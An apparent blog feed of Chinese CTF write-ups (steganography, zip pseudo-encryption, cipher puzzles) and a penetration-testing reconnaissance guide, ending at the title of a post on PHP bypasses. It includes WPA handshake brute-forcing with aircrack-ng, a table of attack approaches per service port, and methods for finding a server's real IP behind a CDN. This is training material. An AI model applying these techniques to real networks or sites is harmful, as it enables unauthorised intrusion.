如while语句中使用break语句 while 条件表达式1： 执行代码 if 条件表达式2： break for语句中使用break语句 for 迭代变量 in 变量 if 条件表达式： break 2.continue语句break语句通常会结合if语句使用，在某种条件下跳出当次循环，进行下一次循环。如果是嵌套循环，那么break语句将跳出最内层的当次循环 如while语句中使用break语句 while 条件表达式1： 执行代码 if 条件表达式2： continue for语句中使用break语句 for 迭代变量 in 变量 if 条件表达式： continue 3、pass空语句不做任何事，一般起到占位作用，为得是方便以后进行处理 for 迭代变量 in 变量 if 条件表达式： 语句块 else: pass 10、数字运算类内置函数 函数名 作用 abs(x) 求绝对值，参数可以是整数，也可以是复数，复数就输出复数的模 oct(x) 将一个数字转为8进制字符串 hex(x) 将一个数字转为16进制字符串 chr(x) 返回整数x对应的ASCII的字符 ord(x) 返回x对应的ASCII的值 complex([real[,image]]) 创建一个复数 divmod(a,b) 分别取商和余数，整数和浮点数都可以 float(x) 将x转化为浮点数，如果没有参数返回0.0 int([x[,base]]) 将x转化为int型，base为进制 long([x[,base]]) 将x转化为long型，base为进制 pow(x,y[,z]) 返回x的y次幂 range(strat,stop[,step]) 产生一个序列，默认从零开始 round（x[,n]） 四舍五如=入 sum(iterable[,start]) 对集合求和 bin(x) 将整数x转化为二进制字符串 bool([x]) 将x转化为布尔类型]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 16-31 writeup(misc)]]></title>
    <url>%2F2019%2F08%2F02%2Fbugku-16-26-writeup-misc%2F</url>
    <content type="text"><![CDATA[十六、想蹭网络先破解wifi密码题目给了我们一个数据包，且提示我们flag为wifi密码， 第一步：打开文件，WIFI连接认证的重点在WPA的四次握手包，即eapol协议的包，过滤一下：刚好四个包 第二步既然是密码，还给了我们数据包，那么我们开始爆破，首先需要一个字典 因为手机号为11位，给了我们7位，故我们使用一下python代码生成字典代码如下： import string s = string.digits f = open(&apos;1.txt&apos;, &apos;w&apos;) for i in s: for j in s: for k in s: for o in s: f.write(&quot;1391040&quot;+i+j+k+o+&apos;\n&apos;) 第三步使用aircrack-ng进行爆破。 首先进行安装aircrack-ng，我在kali下进行操作。无法锁定的原因是我之前使用终端时，可能强制退出，还有命令在执行，那么我们就强制解除,命令如下 sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock 然后进行安装aircrack-ng命令如下 apt-get install aircrack-ng 安装好用，进行爆破，得出密码 aircrack-ng -a2 wifi.cap -w password.txt aircrack-ng使用 aircrack-ng -w 字典文件 目标 破解KEY,漫长的过程.漫不漫长取决于两个方面:一是网管的聪明程度(能否设置出复杂的密码),二是电脑的速度. usage:aircrack-ng[options]&lt;.cap/.ivsfile(s)&gt; Commonoptions: -a&lt;amode&gt;:暴破(1/WEP,2/WPA-PSK) -e&lt;essid&gt;:选择essid为目标 -b&lt;bssid&gt;:选择ap的mac为目标,就是破解识别的关键字 -q:使用安静模式,无数出模式 -C&lt;macs&gt;:将所有的AP合并为一个虚拟的 –help:显示这个帮助 十七、linux2根据题目提示，flag为key{}，那么使用winhex打开文件，并搜索key发现flag. 十八、账号被盗了点击getf lag，发现没有管理员权限，那么我们就想到cookie,使用抓包工具将cookie的值，改成ture，即可得到一个网站然而发现该网站我怎么也进去，打扰了。 十九、细心的大象1、下载图片，使用winhex打开没发现什么有用的信息 2、用binwalk查看图片是否包含其他文件，成功分离出一个压缩文件3、发现该压缩文件里有个图片是加密的，于是我们寻找密码 4、在用winhex看一下大象的图片，还是没发现重要信息，我们打开文件的属性，去看看文件的详细信息里面有什么信息，发现一串类似于base64加密的东西。5、把该串信息当作密码输入，发现失败了，base64解密后，再输入，可以得到以下图片使用winhex打开修改图片的高为500，就可以在图片里看到flag了 二十、爆照1、首先对文件进行分析，发现1个压缩包，压缩包里有一个动态图和8个文件。更具文件的大小可以发现88、888、8888比较特殊。flag应该在这3张图片里。 使用winhex打开可以依次打开这3个文件可以发现这3个文件都是jpg文件。修改后缀名为jpg 可以发现88文件有个二维码，扫描得bilibili 888文件是个图片，查看文件详细信息可以发现一段base64加密的数据，解密得silisili8888文件修改后缀名得到一张图片，详细信息没有有用信息，使用binwalk分析下，发现了一个压缩包。压缩包里有一个二维码图片，扫描得panama故该题flag为{bilibili_silisili_panama} 二十一、猫片（安恒）根据题目提示，这样应该是LBS隐写1、下载附件修改后缀名为png 2、使用stegsolve打开，使用其DATA extract功能进行分析，根据提示为LSB,BGR隐写，经过下图操作，保存为png文件。3、发现图片打不开，使用winhex打开查看，进行下图操作，然后保存，发现是半张二维码 4、进行图片高度的修改，可以得到一张完整的二维码，扫描下载flag.rar压缩包打开文件，有上面的错误，flag文件里的内容，有点气，费尽脑子，发现无可奈何，于是开始查各种资料。发现是ntfs文件数据流隐写，就说题目的提示为什么ntfs没用到。使用ntfsstreamsEditor工具查找数据流，然后导出（注意这边一个坑：flag.rar这个压缩文件一定要用winrar来解压才能找得到数据流） 发现导出的数据流文件是python反编译文件。直接扔到在线我就进行python反编译 ，https://tool.lu/pyc/得到以下结果 import base64 def encode(): flag = &apos;*************&apos; ciphertext = [] for i in range(len(flag)): s = chr(i ^ ord(flag[i])) if i % 2 == 0: s = ord(s) + 10 else: s = ord(s) - 10 ciphertext.append(str(s)) return ciphertext[::-1] ciphertext = [ &apos;96&apos;, &apos;65&apos;, &apos;93&apos;, &apos;123&apos;, &apos;91&apos;, &apos;97&apos;, &apos;22&apos;, &apos;93&apos;, &apos;70&apos;, &apos;102&apos;, &apos;94&apos;, &apos;132&apos;, &apos;46&apos;, &apos;112&apos;, &apos;64&apos;, &apos;97&apos;, &apos;88&apos;, &apos;80&apos;, &apos;82&apos;, &apos;137&apos;, &apos;90&apos;, &apos;109&apos;, &apos;99&apos;, &apos;112&apos;] 进行解密脚本的编写 def decode(): ciphertext = [ &apos;96&apos;, &apos;65&apos;, &apos;93&apos;, &apos;123&apos;, &apos;91&apos;, &apos;97&apos;, &apos;22&apos;, &apos;93&apos;, &apos;70&apos;, &apos;102&apos;, &apos;94&apos;, &apos;132&apos;, &apos;46&apos;, &apos;112&apos;, &apos;64&apos;, &apos;97&apos;, &apos;88&apos;, &apos;80&apos;, &apos;82&apos;, &apos;137&apos;, &apos;90&apos;, &apos;109&apos;, &apos;99&apos;, &apos;112&apos;] ciphertext.reverse() # 加密中使用ciphertext[::-1]进行取反，故使用reverse取反， flag = &apos;&apos; for i in range(len(ciphertext)): # 加密中使用的是flag的长度，而ciphertext与flag长度一样 if i % 2 == 0: s = int(ciphertext[i]) - 10 # 加密中s的值其实就是int(ciphertext[i]) else: s = int(ciphertext[i]) + 10 s = chr(i ^ s) # 加密中为i和flag异或，那么i与s异或即可的到flag flag += s return flag if __name__ == &apos;__main__&apos;: flag = decode() print(flag) 二十二、多彩下载图片，放到Stegsolve里面跑下。发现了图片的名称又是lipstick.png (lipstick是口红意思），这边又有YSL，所以怀疑与YSL口红有关(圣罗兰口红).使用data extract分析下，发现PK开头，直接save bin 存为zip格式![在这里插入图片描述]bugku-16-26-writeup-misc\18.png)发现文件打不开，于是使用winhex打开，进行图中操作，成功打开文件，发现flag.txt文件加密 然后解压文件会产生错误，这里有个小坑注意，不能使用winrar解压，要使用360压缩等解压。未完待续，卡住了这题 二十三、旋转跳跃一看题目，提示我们密码，还是音频文件，目测是音频隐写。上工具MP3Stego。可以参考我的这篇博客可以得到一个txt文件，，得到flag 二十四、普通的二维码扫描会得到一句话：我不会告诉你flag就在这里。使用winhex打开发现最后一段数字，应该是8进制数。编写python脚本转ASCII码，即可得到flag a = &apos;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&apos; flag = &apos;&apos; for i in range(len(a) // 3): flag += chr(int(a[i * 3:i * 3 + 3], 8)) # 八进制3为一个ASCII码 print(flag) 二十五、乌云邀请码经过一些尝试，原理是LSB隐写，使用Stegsolve工具的Data Extract功能即可得到flag 二十六、神秘文件下载附件，发现里面有一张图片，和一个压缩包，且压缩包里也有一个一模一样不过是加密的图片。1、于是我们想到明文攻击。使用ARCHPR工具进行攻击。 2、注意把logo压缩成压缩包，并且把flag.zip的压缩包里的doc文件删除。 3、这边有一个坑，我们的压缩算法要与flag.zip的压缩算法一样才可以。我卡了好久在这。 4、可以复制flag.zip然后存入logo.png文件，然后修改名字为logo.zip。 5、可以得到口令，输入口令我们发现是一个笑脸进行binwalk文件分离然后在docProps文件下有个flag.txt，进行base64解码即可得flag。破解zip加密的常见的几种方法，可以参考这个大佬的博客 二十八、图穷比见下载附件，使用winhex打开，在文件最后面发现一大堆16进制，然后复制到notepad里使用插件里的converter进行转化为ascii码。发现是一对坐标，然后把左右括号去掉，把逗号换成空格然后使用gnuplot工具画图使用命令 plot &quot;E:\\gnuplot\\2.txt&quot;扫描得flag 二十九、convert一、打开文件发现一堆二进制，保存为2.txt文件，那肯定得转化为16进制，这边我尝试直接利用脚本转化为10进制然后转化为ASCII,发现是个rar文件，却因为有些字体识别不了乱码，打不开文件。 with open(&apos;2.txt&apos;, &apos;w&apos;,encoding=&apos;utf-8&apos;) as f1: with open(&apos;1.txt&apos;,encoding=&apos;utf-8&apos;) as f2: while True: temp = f2.read(4) if temp: temp = int(temp, 2) # 二进制转10进制 temp = hex(temp) # 10进制转16进制 f1.write(temp[2:]) # 去掉0x else: break 二、利用Notepad++自带的十六进制转ascii，发现rar文件头，将文件另存为一个rar文件。打开文件发现里面有一个图片，我们先看下属性，发现有一串base64码。然后在线解密，发现flag. 三十、听首音乐听了一会后，没听出啥，使用audacity进行分析，发现有点像摩斯密码然后放大，摩斯密码有两种“符号”用来表示字符：点（.）和划（-），或叫“滴”（Dit）和“答”（Dah）。（滴，1t；嗒，3t），分析，写出摩斯密码为（每一组后面加上空格） ..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -.. ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-. 在线解密http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx 三十一、好多数值打开题目发现一堆数值，有点像rgb的值，255,255,255就是白色。那么题目的思路就是一个根据这堆值生成图片 把行61366因式分解分解成两个数相乘（503*122） from PIL import Image x = 503 # x坐标 通过对txt里的行数进行整数分解 y = 122 # y坐标 x*y = 行数 im = Image.new(&quot;RGB&quot;, (x, y)) # 创建图片 with open(&apos;1.txt&apos;) as file: # 打开rbg值文件 # 通过一个个rgb点生成图片 for i in range(0,x): for j in range(0,y): line = file.readline() # 获取一行的rgb值 rgb = line.split(&quot;,&quot;) # 分离rgb im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2]))) # rgb转化为像素 im.show()]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 1-15 writeup(misc)]]></title>
    <url>%2F2019%2F08%2F02%2Fbugku-1-15-writeup-misc%2F</url>
    <content type="text"><![CDATA[一、这是一张单纯的图片保存图片，使用记事本打开图片，发现末尾有编码的一段文字在网页中&amp;#开头的是HTML实体，一些字符在 HTML 中是预留的，拥有特殊的含义，比如小于号‘&lt;’用于定义 HTML 标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML 源码中插入字符实体。详情请看http://baike.baidu.com/view/4757776.htm 如何把汉字转换成HTML实体呢？ 其实很简单，汉字的HTML实体由三部分组成，”&amp;#+ASCII+;“ 即可。在线转化链接https://uni2ascii.supfree.net/ 解密即可得flag 二、隐写前置知识png图片的参数IHDR 文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。 文件头数据块由13字节组成，它的格式如下表所示。找到IHDR，然后修改A1为F1,即可得到flag. 三、telnet前置知识：Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力 打开题目，下载数据包，使用wireshark软件打开，过滤telnet数据包，寻找flag 四、眼见非实(ISCCCTF)得到文件：zip ，无法解压用winhex打开，发现文件头是：504B0304是zip文件，改后缀为zip解压，得到word文档，打开错误，继续改后缀为zip解压得到很多文件，最后在document.xml文件中发现flag。 五、又一张图片，还单纯吗使用StegSolve打开使用其analyse中的frame browser发现flag 六、猜根据题目提示：进行在线识图，即可得出flag 七、宽带信息泄露bin文件是二进制文件，那么就用routerpassview工具打开，发现是个配置文件，题目说是宽带用户名，我们尝试下搜索username，flag为flag{053700357621} 八、隐写21、下载图片，首先思路是用winHex打开，发现没有内容。修改文件后缀名为zip,发现里面包含了2个文件，一个是密码提示文件，一个是flag文件。 2、通过百度可以知道红桃k为查理曼，雅典娜为黑桃Q,梅花J代表着兰斯洛特（扑克牌的J、Q、K分别代表着侍卫、王后、国王）使用密码为KJQ（王后和国王间有个小三），观察键盘可以发现面应数字为871（提示密码为3位数）.当然也可以使用APCHPR进行爆破得到图片后使用winhex打开，发现base64加密解密即可得flag，但是不知道为什么flag一直提交不正确flag{y0u Are a h@cker!} 九、多种方法解决下载附件，发现无法直接打开。使用notepad打开，发现是个png文件，且base64加密，删除密文前面没用的信息，然后进行base64解密，另存为png图片，得到一个二维码，扫描可得flag，或者使用OR research分析。即可得flag。 十、闪得好快拿到图片。第一想法就是StegSolve打开使用其analyse中的frame browser功能，发现有18张二维码，一张张扫吧，即可得出flag。 十一、come_game打开游戏玩了几下，发现到第二个怎么也过不去（或许是我菜）发现多了个保存文件，用winhex打开保存文件发现以下内容，把32改成35。这里的32应该代表第二个，那么改成35直接通关。然后再次打开游戏，即可得到flag注意flag格式为SYC{}。因为题目来源：第七季极客大挑战。 十二、白哥的鸽子直接使用notpade打开，发现文件末尾有类似flag格式的字符串，拷贝出来得到 g2ivyo}l{2s3_o@aw__rcl@进行栅栏解密得到 lag{w22_is_v3ry_cool}@@ 加个f即可得到flag，注意提交flag时需要把最后的@@去掉 十三、linux下载附件，打开后直接用notepad打开flag文件，发现里面有个key,就是flag 十四、隐写3查看图片明显少了下半身得到flag 十五、做个游戏这个游戏是坚持60秒就可以得到flag,我最多玩18秒就gameover了。这时候就需要反编译了，使用反编译工具jd-gui，不过需要java环境。开始审计代码，发现flag编译工具jd-gui（windows版本）下载链接：https://pan.baidu.com/s/1sp7U7YwrXc7XObRe1r6jVg提取码：6dbs]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[zip伪加密]]></title>
    <url>%2F2019%2F08%2F02%2Fzip%E4%BC%AA%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[zip伪加密1. 原理就是修改了zip的文件头的加密标位（全局方式标记位），使文件打开显示需要密码，实际没有密码。 2. zip文件的格式 简单说一个 ZIP 文件由三个部分组成： 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 压缩源文件 数据区：50 4B 03 04 头文件标记 压缩源文件 目录区：50 4B 01 02：目录区文件头标记1F 00：压缩使用的 pkware 版本 或3F 0014 00：解压文件所需 pkware 版本00 00：全局方式位标记（伪加密，改为 09 00 就提示有密码了） 压缩源文件 目录结束： 可以参考这篇博客如 压缩文件数据区域 3.识别真假加密无加密数据区 的全局加密应当为 00 00目录区 的全局方式位标记应当为 00 00 假加密数据区 的全局加密应当为 00 00目录区 的全局方式位标记应当为 09 00 真加密数据区 的全局加密应当为 09 00目录区 的全局方式位标记应当为 09 00 如压缩文件目录区域]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[攻防世界misc部分]]></title>
    <url>%2F2019%2F08%2F02%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[一、功夫再高也怕菜刀下载附件，用foremost进行pcapng文件的分离，得到一个压缩包，打开压缩包，得到一份加密的flag文件。 foremost的下载地址https://github.com/raddyfiy/foremost （windows系统可用） 简单的使用介绍在zip里可以发现一个加密的flag.txt文件。用wireshark打开6666.pcapng文件，查找flag.txt关键字发现有个6666.jpg文件，使用TCP追踪流，复习下面蓝色部分。FFD8开头，FFD9结尾，并在winhex中新建文件复制并粘贴。注意粘贴格式选择为ASCII Hex。 报存为jpg格式，可以得到图片，图片里的文字就是密码，输入密码，得到flag. 二、菜狗收到了图后很开心，玩起了pdf(flag格式为大写)下载附件后，发现是pdf,那么在google上安装插件PDF Viewer，控制台输入document.documentElement.textContent（获取整个文档的文本以及CDATA数据），得到一串AB编码而成的字符串，猜测是摩斯密码，利用记事本的功能快速，将A变为 . ，B变为 - ，然后将替换后的字符进行摩斯解密在线解密即可得出flag j 三、SSCTF线上选举美男大赛开始了，泰迪拿着他的密码去解密了，提交花括号内内容（Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==）前置知识所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第i个字连起来，形成一段无规律的话。 一般比较常见的是2栏的棚栏密码。 比如明文：THERE IS A CIPHER 去掉空格后变为：THEREISACIPHER 两个一组，得到：TH ER EI SA CI PH ER 先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR 连在一起就是：TEESCPEHRIAIHR 这样就得到我们需要的密码了！ 而解密的时候，我们先吧密文从中间分开，变为两行： T E E S C P E H R I A I H R 再按上下上下的顺序组合起来： THEREISACIPHER 分出空格，就可以得到原文了： THERE IS A CIPHER 但是有些人就偏不把密码作出2栏，比如： 明文：THERE IS A CIPHER 七个一组：THEREIS ACIPHER 抽取字母：TA HC EI RP EH IE SR 组合得到密码：TAHCEIRPEHIESR 那么这时候就无法再按照2栏的方法来解了… 不过棚栏密码本身有一个潜规则，就是组成棚栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 这样，我们可以通过分析密码的字母数来解出密码… 比如：TAHCEIRPEHIESR 一共有14个字母，可能是2栏或者7栏… 尝试2栏…失败 尝试7栏…成功 然而当棚栏和拼音相结合后，诞生出一种令人痛恨的新思路（如韵母和声母） 凯撒移位密码也就是一种最简单的错位法，将字母表前移或者后错几位，例如：明码表：ABCDEFGHIJKLMNOPQRSTUVWXYZ密码表：DEFGHIJKLMNOPQRSTUVWXYZABC这就形成了一个简单的密码表，如果我想写frzy（即明文），那么对照上面密码表编成密码也就是iucb（即密文）了。密码表可以自己选择移几位，移动的位数也就是密钥。进制转换密码。 比如给你一堆数字，乍一看头晕晕的，你可以观察数字的规律，将其转换为10进制数字，然后按照每个数字在字母表中的排列顺序，拼出正确字母。举例：110 10010 11010 11001解：很明显，这些数字都是由1和0组成，那么你很快联想到什么？二进制数，是不是？嗯，那么就试着把这些数字转换成十进制试试，得到数字6 18 26 25，对应字母表，破解出明文为frzy 然后再进行栅栏解密得到flag 四、一个恐怖份子上传了这张照片到社交网络。里面藏了什么信息？本题为jpg图片信息隐写outguess 工具（在kali里，可对jpg图形隐藏信息查询） 安装方法终端命令输入git clone https://github.com/crorvick/outguess进行下载，下载完成后进入outguess文件夹， 执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。使用方法 加密：outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg加密之后，demo.jpg会覆盖out.jpg,hidden.txt中的内容是要隐藏的东西 解密：outguess -k “my secret key” -r out.jpg hidden.txt或者outguess -r lamb.jpg hidden.txt 解密之后，解密内容放在hidden.txt中然后使用cat hidden.txt查看 -r解密，-d加密 使用,下面2行代码得到flag outguess -r lamb.jpg hidden.txt cat hidden.txt]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[信息收集]]></title>
    <url>%2F2019%2F08%2F01%2Finformation-collection%2F</url>
    <content type="text"><![CDATA[1、域名信息收集1.1whois查询可以通过爱站工具网，站长之家，VirusTotal这些网站查询域名的相关信息，如域名服务商，域名拥有者，以及他们的邮箱。电话，地址等 kali系统自带whois。语法如下 whois 所要查询的域名 1.2、备案信息查询网站备案是指向主管机关报告事由存案以备查考。行政法角度看备案，实践中主要是《立法法》和《法规规章备案条例》的规定。网站备案的目的就是为了防止在网上从事非法的网站经营活动，打击不良互联网信息的传播，如果网站不备案的话，很有可能被查处以后关停。 常用网站有2个ICP备案查询网天眼查 1.3、敏感信息收集我们可以通过构造特殊的关键字来收集敏感信息Goole的常用语法及其说明，（其他搜索引擎的语法大同小异）| 关键字 | 说明 || ——– | —————————————————- || Site | 指定域名 || Inurl | URL中的存在关键字的网页 || Intext | 网页正文中的关键字 || Filetype | 指定文件类型 || Intitle | 网页标题中的关键字 || link | link:baidu.com即表示返回所有和baidu.com做了连接的URL || Info | 查找一些指定站点的一些基本信息 || cache | 搜索Goole里关于某些内容的缓存 |如，关键字的混合使用还有burp suit 的repeater功能也可以获取到服务器的一些信息。还可以通过乌云漏洞表查询历史的漏洞信息 2、子域名信息收集2.1、工具收集使用的工具主要有Layer子域名挖掘机、K8/wydomain等等，这边推荐Layer子域名挖掘机，Sublist3r和subDomainsBrute Layer子域名挖掘机操作简单，如图 subDomainsBrute需要在python2的环境下使用,具体的大家可以参考这篇文章它的特点是可以快速的发现三、四、五等不被容易探测到的域名 执行命令： python subDomaisBrute.py xxx.com 2.2、搜索引擎枚举如搜索baidu旗下的子域名 2.3、使用第三方服务枚举很多第三方服务汇聚了大量的DNS数据集如DNSdumpster网站、在线DNS侦查和搜索的工具挖掘出指定域潜在的大量子域如DNSdumpster网站部分结果 2.4、证书透明度公开日志枚举证书透明度（CT）是证书授权机构（CA）的一个项目。证书授权机构会把每个SSL/TLS证书发布到公开日志里，这个证书通常包含域名、子域名、邮件地址。然而查找一些证书最简单的方法就是通过一下搜索引擎搜索一些公开的CT日志。 介绍2个网站 crt.sh 和 censys下图为crt网站当然也可以使用一些在线网站查询子域名，如Ip反查绑定域名网站（可以根据域名查询其对应的IP地址和IP物理地址，就是说可以查询该网站的服务器是放在什么地方的，一样可以精确到某个网吧，机房或学校等。） 3、收集常用端口信息通过扫描服务器开放的端口以及从该端口上判断服务器存在的服务，就可以对症下药，便于我们渗透目标服务器常见的工具有nmap、无状态端口扫描工具Masscan、Zmap和御剑高速端口扫描工具 常见的端口及其说明、还有攻击方向汇总 3.1文件共享服务端口 端口号 端口说明 攻击方向 21/22/69 FTP/tftp文件的传输协议 允许匿名的上传、下载、爆破和嗅探操作 2049 Nfs服务 配置不当 139 Samba服务 爆破、未授权访问、远程代码执行 389 Ldap目标服务协议 注入、允许匿名访问、弱口令 3.2、连接远程服务端口 端口号 端口说明 攻击方向 22 SHH远程连接 爆破、SHH隧道以及内网代理的转发和存储、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 3389 Pdp远程桌面连接 shift后门（需要windows Server 2003 以下的版本）、爆破 5900 VNC 弱口令爆破 5632 PyAnywhere服务 抓密码、代码执行 3.3、web应用服务端口 端口号 端口说明 攻击方向 80/443/8080 常见的web服务器端口 web攻击、爆破、对应服务器版本漏洞 7001/7002 webLogic控制台 java反序列化、弱口令 8080/8089 Jboss/Resin/Jetty/Jenkins 反序列化、控制台弱口令 9090 WebSphere控制台 java反序列化、弱口令 4848 GlassFish控制台 弱口令 1352 Lotus domain邮件服务 弱口令、信息泄露、爆破 10000 Webmin-Web控制面板 弱口令 3.4、数据库服务端口 端口号 端口说明 攻击方向 3306 MySQL 注入、提权、爆破 1433 MSSQL数据库 注入、提权、爆破、SA弱口令 1521 Orcale数据库 TNS爆破、注入、反弹shell 5432 PostgreSQL数据库 注入、爆破、弱口令 27017/27018 MongoDB 爆破、未授权的访问 6397 Redis数据库 可尝试为授权访问、弱口令爆破 5000 Sysbase/DB2 爆破、注入 3.5、邮件服务端口 端口号 端口说明 攻击方向 25 SMTP邮件服务 邮件伪造 110 POP3协议 爆破、嗅探 143 IMAP协议 爆破 3.6、网络常见协议端口 端口号 端口说明 攻击方向 53 DNS域名系统 允许区域传送、DNS劫持、缓存投毒、欺骗 67/68 DHCP服务 劫持、欺骗 161 SNMP协议 爆破、收集目标内网信息 3.7、特殊服务端口 端口号 端口说明 攻击方向 2811 Zookeeper服务 未授权访问 8069 Zabbix服务 远程执行、SQL注入 9200/9300 Elasticsearch服务 远程执行 11211 Memcache 未授权访问 512/513/514 Linux Rexec服务 爆破、Rlogin登录 873 Rsync服务 匿名访问、文件上传 3690 Svn服务 Svn泄露、未授权访问 50000 SAP Management Console 远程执行 4、CMS识别在进行渗透时得识别出相应的web容器或CMS才可以进行渗透 CMS是Content Management System的缩写，意为”内容管理系统”。 内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。业界公认的国内比较权威的产品有CmsTop、TurboCMS、TRS。对于内容管理，业界还没有一个统一的定义，不同的机构有不同的理解。 常见的CMS有Dedecms(织梦)、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等 代表工具有御剑Web指纹识别，whatWeb、WebRobo、椰树、轻量WEB指纹识别等，可以快速识别一些主流的CMS 在线网站查询CMS指纹识别有：BugScanner云悉指纹和WhatWeb 5、查找真实IP5.1、目标服务器存在CDN若目标服务器不存在CDN,那么我们可以直接通过ip138网来获取目标的一些IP及其域名信息。但是一般是存在CDN的 什么是CDN呢CDN全称:Content Delivery Network或Content Ddistribute Network，即内容分发网络尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。 如果渗透目标具有CDN服务，那么我们ping目标域名得到的只是离我们最近的一台节点的CDN服务器的IP,不是服务器的真实IP,那么我们要怎样获取目标服务器真实的IP呢 5.2、判断目标是否使用了CDN可以通过ping目标域名来判断，如下图可以发现baidu服务器存在CDN服务 5.3、绕过CDN寻找真实的IP介绍一些常规的方法 1、内部邮箱源。一般的邮箱系统在内部，没有经过CDN解析。故可以ping邮箱服务器的域名，必须是目标自己的邮箱服务器，不是第三方或者公共邮箱服务器。 2、扫描网站测试文件，如phpinfo，teste=等 3、分站域名。一般来说主战的访问量比较大，所以是主张挂CDN,分站可能没有挂。通过ping二级域名获取分站IP,从而1推测主站IP 4、国外访问。一般来说国内的CDN只对国内的用户访问加速，对国外就不一定了。可以通过国外在线代理网站App Synthetic Monitor访问,可能会得到真实IP 5、查看域名解析记录 6、如果目标网站有自己的App,通过抓包工具抓取App的请求，从而找到真实IP 7、通过CloudFlareWatch在线网站查找真实IP 5.4、如何验证IP的真实性 可以手工直接访问ip看响应页面是否与访问域名返回的页面一样。也可以通过工具批量访问，如Masscan等工具。 6、敏感目录文件收集针对网站扫描工具，主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder、Sensitivefilescan、Weakfilescan等 在线工作站有webSacn等下面是DirBuster存在界面，需要java环境Browse是选择自己的字典也可以选择工具自带的字段，而list info是选择自己的字典 对最后一个红框进行说明，如果你选择扫描的目录为http://www.wedd.com/admin/,那么在URL to fuzz里久有写上“/admin/{dir}”,在{dir}前后都可以随意拼接你想要的目录或后缀]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019ISCC misc 第2/4/7题]]></title>
    <url>%2F2019%2F08%2F01%2F2019ISCC-misc-%E7%AC%AC2-4-7%E9%A2%98%2F</url>
    <content type="text"><![CDATA[第2题：下载附件，修改文件后缀名为zip，发现50个二维码。发现最后一张二维码，格式为jpg与其他二维码都不一样。用winhex打开，发现flag。注意这边有个坑，flag提交时要把flag{}去掉。 第4题：下载附件是一个动态的jpg,使用winhex打开在末尾发现疑是base64加密，拿去在线解密，得到Salted__P)=N6q(эl%.,D7ێպ?1C’Ϊɒ~`৵܋ߖ߄zgF4_1ζ$wOk̆ӊ$Ôj睼̍⾐*!n。怀疑是ASE加密至于什么是ASE加密请看这篇博客直接解密发现解密不了。ASE在线解密猜想密钥是ISCC,连续解密2次发现flag 第7题下载压缩包发现，图片损坏，打开winhex保存即可得到正常的png图片。修改后缀名为zip,h获得音频文件。打开png图片扫描为当铺密码，在线解码：http://www.zjslove.com/3.decode/dangpu/index.html 何为当铺密码：简单说就是当前汉字有多少笔画出头，就是转化成数字几。 然后我们使用MP3Stego工具进行音频隐写的解密，-X后面为要解密的音频文件，-P后面为密码（要把音频文件放在Decode.exe的同一个目录下，一个音频文件解压需要密码）打开01.MP3.txt，发现里面为&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125;进行10进制转ascii码即可得到flag.]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[strpos数组绕过，密码MD5比较绕过,MD5函数===绕过]]></title>
    <url>%2F2019%2F08%2F01%2Fstrpos%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%EF%BC%8C%E5%AF%86%E7%A0%81MD5%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87-MD5%E5%87%BD%E6%95%B0-%E7%BB%95%E8%BF%87%2F</url>
